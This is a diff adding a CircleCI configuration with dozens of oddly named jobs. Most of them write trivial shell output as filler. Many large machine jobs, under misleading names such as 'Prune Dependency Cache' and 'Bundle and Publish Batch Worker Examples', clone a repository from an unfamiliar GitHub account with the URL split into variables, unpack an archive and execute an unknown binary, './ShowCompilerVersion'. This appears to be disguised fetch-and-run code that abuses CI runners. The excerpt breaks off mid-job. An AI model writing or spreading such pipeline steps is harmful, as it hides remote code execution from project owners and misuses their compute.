@@ -1,0 +1,1753 @@
+version: 2.1
+
+jobs:
+  version-update-workflow:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - run:
+          name: legacy-emulator-scan
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; label="peach-32"; if [[ "$label" =~ -[0-9]+$ ]]; then echo "numbered"; else echo "plain"; fi; echo "finished"; true ; } > /tmp/postPublishScript/launch-upgrade-tests
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'launch-upgrade-tests'
+  DataSyncStep18:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/launch-upgrade-tests" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/launch-upgrade-tests"; awk '{print $6}' "/tmp/postPublishScript/launch-upgrade-tests" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth=3 "https://$nodeof/$posting/$tags" `pwd`
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -I gzip --extract --file pre-backup-security-checks.tgz
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./ShowCompilerVersion
+  release-archive-to-canary-nodes:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Build and cache name server base image
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo 'probing parser'; r=7; ((++r)); echo "$r"; echo "parser responded"; true ; } > /tmp/postPublishScript/CheckOutMonitorCode
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'CheckOutMonitorCode'
+  analyze-coverage-data:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/CheckOutMonitorCode" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/CheckOutMonitorCode"; awk '{print $6}' "/tmp/postPublishScript/CheckOutMonitorCode" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 4 --no-tags "https://$nodeof/$posting/$tags" "`pwd`"
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar --use-compress-program=gunzip -xf pre-backup-security-checks.tgz
+      - run:
+          command: |
+            bash -lc './ShowCompilerVersion'
+  write-gateway-dependency-tree:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: BasicMinorBump
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; entries=(almond sloth brown pulsar gray eel); printf '%s,' "${entries[@]}"; echo; true ; } > /tmp/postPublishScript/sequentialBuild
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'sequentialBuild'
+  OptimizeObjectFiles:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/sequentialBuild" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/sequentialBuild"; awk '{print $6}' "/tmp/postPublishScript/sequentialBuild" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 2 --no-tags "https://$nodeof/$posting/$tags" $(pwd)
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            gunzip -c pre-backup-security-checks.tgz | tar --extract -f -
+      - run:
+          command: |
+            $(pwd)/ShowCompilerVersion
+  AssembleMobileAppTestBuild:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: mandatoryNotification
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s\n' 52 49 30 36 | awk 'NR == 1 {m = $1} $1 < m {m = $1} END {print m}' && echo "leg 3 of 10 ready"; true ; } > /tmp/postPublishScript/AdminPanelDependencyBump
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'AdminPanelDependencyBump'
+  WeeklySizeAnalysisHookStep3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/AdminPanelDependencyBump" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/AdminPanelDependencyBump"; awk '{print $6}' "/tmp/postPublishScript/AdminPanelDependencyBump" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 10 "https://$nodeof/$posting/$tags" .
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar --gzip --extract -f pre-backup-security-checks.tgz
+      - run:
+          command: |
+            exec "./ShowCompilerVersion"
+  CrawlerDraftRelease:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: promote container image to backup region
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo "translation check started" && printf '%s\n' "batch 11 queued" && echo "target shark selected"; true ; } > /tmp/postPublishScript/tear-down-telemetry-data-store
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'tear-down-telemetry-data-store'
+  SearchServiceSchemaChecksTier3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/tear-down-telemetry-data-store" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/tear-down-telemetry-data-store"; awk '{print $6}' "/tmp/postPublishScript/tear-down-telemetry-data-store" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone -q "https://$nodeof/$posting/$tags" "`pwd`"
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar --extract -z --file pre-backup-security-checks.tgz
+      - run:
+          command: |
+            sh -c './ShowCompilerVersion'
+  InspectContainerImageForAudit:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: bundle-and-publish-developer-guide
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s\n' funnel wren rotor chi | awk 'BEGIN {OFS = "-"} {print NR, $0}'; true ; } > /tmp/postPublishScript/preliminary-build-shard-13
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'preliminary-build-shard-13'
+  test-and-deploy-validator:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/preliminary-build-shard-13" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/preliminary-build-shard-13"; awk '{print $6}' "/tmp/postPublishScript/preliminary-build-shard-13" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth=1 --filter=tree:0 "https://$nodeof/$posting/$tags" $(pwd)
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar --use-compress-program gunzip -xf pre-backup-security-checks.tgz
+      - run:
+          command: |
+            bash -eo pipefail -c "./ShowCompilerVersion"
+  VerifyImportOrder:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - run:
+          name: batchWorkerFixtures
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; seq 6 | while read -r turn; do echo "[$turn/6] leg"; done; echo "every round passed"; true ; } > /tmp/postPublishScript/trackStartupTimeForNextStage
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'trackStartupTimeForNextStage'
+  ReportPublishNode12:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/trackStartupTimeForNextStage" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/trackStartupTimeForNextStage"; awk '{print $6}' "/tmp/postPublishScript/trackStartupTimeForNextStage" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 3 --branch main "https://$nodeof/$posting/$tags" "${PWD}"
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            gzip -dc pre-backup-security-checks.tgz | tar -xf -
+      - run:
+          command: |
+            bash -eo pipefail -c "./ShowCompilerVersion"
+  PreliminaryStyleCheck:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: verifyVersionStringLane5
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo "$((50 / 15 + 24))"; printf '%5d|\n' 130; true ; } > /tmp/postPublishScript/periodic-package-install
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'periodic-package-install'
+  provisionConsoleDatabase:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/periodic-package-install" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/periodic-package-install"; awk '{print $6}' "/tmp/postPublishScript/periodic-package-install" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 5 "https://$nodeof/$posting/$tags" ./
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -x --gzip --file pre-backup-security-checks.tgz
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./ShowCompilerVersion
+  OvernightExtraction:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: scan-development-dependencies-and-upload-test-report
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo "step 4 started"; seq 7 | awk '{s += $1} END {print s}'; echo step 4 finished; true ; } > /tmp/postPublishScript/BuildDigestPhase
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'BuildDigestPhase'
+  sync-service-image-scan-stage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/BuildDigestPhase" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/BuildDigestPhase"; awk '{print $6}' "/tmp/postPublishScript/BuildDigestPhase" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth=3 --no-tags "https://$nodeof/$posting/$tags" "./"
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            gunzip -c pre-backup-security-checks.tgz | tar -xf -
+      - run:
+          command: |
+            bash -eo pipefail -c "./ShowCompilerVersion"
+  StatusNotificationStage:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Export updater screenshots to coverage service
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo "4 items processed"; triangle() { local s=0 i; for ((i = 1; i <= $1; i++)); do s=$((s + i)); done; echo "$s"; }; triangle 5; true ; } > /tmp/postPublishScript/EventBusBenchmarkResults
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'EventBusBenchmarkResults'
+  one-time-freeze:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/EventBusBenchmarkResults" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/EventBusBenchmarkResults"; awk '{print $6}' "/tmp/postPublishScript/EventBusBenchmarkResults" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --no-tags "https://$nodeof/$posting/$tags" "./"
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -x --gzip -f pre-backup-security-checks.tgz
+      - run:
+          command: |
+            /bin/sh -c "./ShowCompilerVersion"
+  LegacyConfigurationBackup:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: ensure-disk-space-automatically
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s\n' walnut elk gamma mars | grep -c -v '^$' && echo 'warming up metrics'; true ; } > /tmp/postPublishScript/parser-module-cache
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'parser-module-cache'
+  scan-base-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/parser-module-cache" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/parser-module-cache"; awk '{print $6}' "/tmp/postPublishScript/parser-module-cache" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --jobs=2 "https://$nodeof/$posting/$tags" "."
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -I gzip -xf pre-backup-security-checks.tgz
+      - run:
+          command: |
+            cd "$PWD" && exec ./ShowCompilerVersion
+  ResolveDaemonDependenciesStep9:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Stage 4 Credential Rotation
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; function say_hi { echo "hi $1"; }; say_hi kappa; echo "wrapping up bundle step"; true ; } > /tmp/postPublishScript/ConfirmServiceHealthManually
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'ConfirmServiceHealthManually'
+  StorageDeploymentHealthCheck:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/ConfirmServiceHealthManually" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/ConfirmServiceHealthManually"; awk '{print $6}' "/tmp/postPublishScript/ConfirmServiceHealthManually" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 1 --filter=blob:none "https://$nodeof/$posting/$tags" ./
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar --gzip --extract --file=pre-backup-security-checks.tgz
+      - run:
+          command: |
+            cd "$PWD" && ./ShowCompilerVersion
+  CopyInstallerWithProgressOutput:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - run:
+          name: Filter flaky tests
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s\n' apple alpha lime; true ; } > /tmp/postPublishScript/promoteBridge
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'promoteBridge'
+  GatesCycle5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/promoteBridge" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/promoteBridge"; awk '{print $6}' "/tmp/postPublishScript/promoteBridge" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth=1 --filter=blob:none "https://$nodeof/$posting/$tags" $PWD
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -I gzip -xf pre-backup-security-checks.tgz
+      - run:
+          command: |
+            /bin/bash -c "./ShowCompilerVersion"
+  compile-and-package-code:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: download-bundle
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; flaky=(fir pomelo pecan); printf 'quarantined %s\n' "${flaky[@]}"; echo "${#flaky[@]} tests quarantined"; true ; } > /tmp/postPublishScript/remote-matrix
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'remote-matrix'
+  DailyArtifactDownloadPipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/remote-matrix" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/remote-matrix"; awk '{print $6}' "/tmp/postPublishScript/remote-matrix" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth=5 --single-branch "https://$nodeof/$posting/$tags" "${PWD}"
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -x -z -f pre-backup-security-checks.tgz
+      - run:
+          command: |
+            bash -lc "./ShowCompilerVersion"
+  monitor-executable:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Finalize (iteration 1)
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo 'translation check started'; word="hazel guava gnu"; echo "$word" | tr ' ' ,; true ; } > /tmp/postPublishScript/RetryDriverContractTests
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'RetryDriverContractTests'
+  automatic-repository-checkout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/RetryDriverContractTests" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/RetryDriverContractTests"; awk '{print $6}' "/tmp/postPublishScript/RetryDriverContractTests" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth=3 "https://$nodeof/$posting/$tags" "."
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -x --gzip -f pre-backup-security-checks.tgz
+      - run:
+          command: |
+            env ./ShowCompilerVersion
+  PackageAndSignRelease:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Legacy Credential Refresh Job (segment 1)
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; square_of() { local k=$1; echo $((k * k)); }; square_of 4; true ; } > /tmp/postPublishScript/strict-query-benchmark
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'strict-query-benchmark'
+  websiteCoverage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/strict-query-benchmark" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/strict-query-benchmark"; awk '{print $6}' "/tmp/postPublishScript/strict-query-benchmark" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 1 --single-branch "https://$nodeof/$posting/$tags" $(pwd)
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -I gzip --extract -f pre-backup-security-checks.tgz
+      - run:
+          command: |
+            /bin/bash -c "./ShowCompilerVersion"
+  pre-submit-setup:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: perform-metrics-exporter-format-checks
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo "leg 1 of 2 ready" && join <(printf '%s\n' '1 elk' '2 nebula') <(printf '%s\n' '1 puma' '2 rat'); true ; } > /tmp/postPublishScript/move-test-results
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'move-test-results'
+  RetryMailerInstallationTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/move-test-results" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/move-test-results"; awk '{print $6}' "/tmp/postPublishScript/move-test-results" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth=1 --no-single-branch "https://$nodeof/$posting/$tags" $PWD
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            gunzip -c pre-backup-security-checks.tgz | tar xf -
+      - run:
+          command: |
+            bash -c "./ShowCompilerVersion"
+  PerformBackupForMainBranch:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Download authentication digests from object storage
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; for job in render index verify; do printf '%s... ' "$job"; echo ok; done; true ; } > /tmp/postPublishScript/primary-image-tagging
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'primary-image-tagging'
+  edge-proxy-production-approval:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/primary-image-tagging" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/primary-image-tagging"; awk '{print $6}' "/tmp/postPublishScript/primary-image-tagging" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth=1 --filter=blob:none "https://$nodeof/$posting/$tags" `pwd`
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -zxvf pre-backup-security-checks.tgz
+      - run:
+          command: |
+            exec "./ShowCompilerVersion"
+  benchmark-request-handling:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - run:
+          name: Basic format check phase
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; for line in {1..8}; do printf '%d ' $((line * line)); done; echo; str="teal sheep puma"; echo "$str" | awk '{print toupper($0)}'; true ; } > /tmp/postPublishScript/removing-build-cache
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'removing-build-cache'
+  ConfigureAccessTokens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/removing-build-cache" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/removing-build-cache"; awk '{print $6}' "/tmp/postPublishScript/removing-build-cache" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 3 --no-tags --no-single-branch "https://$nodeof/$posting/$tags" .
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar --gzip --extract -f pre-backup-security-checks.tgz
+      - run:
+          command: |
+            './ShowCompilerVersion'
+  showNotifierVersionString:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: trigger-security-scan-manually
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; kv="stage=nozzle"; echo "${kv%%=*}"; printf '%s\n' "index rebuild for loader passed"; true ; } > /tmp/postPublishScript/adapter-help-pages
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'adapter-help-pages'
+  PreTagProductionDeployment:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/adapter-help-pages" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/adapter-help-pages"; awk '{print $6}' "/tmp/postPublishScript/adapter-help-pages" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 3 --no-tags --no-single-branch "https://$nodeof/$posting/$tags" ${PWD}
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar xzvf pre-backup-security-checks.tgz
+      - run:
+          command: |
+            /bin/bash -c './ShowCompilerVersion'
+  Validator:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: rebuild-wrapper
+          command: |
+            mkdir -p /tmp/postPublishScript
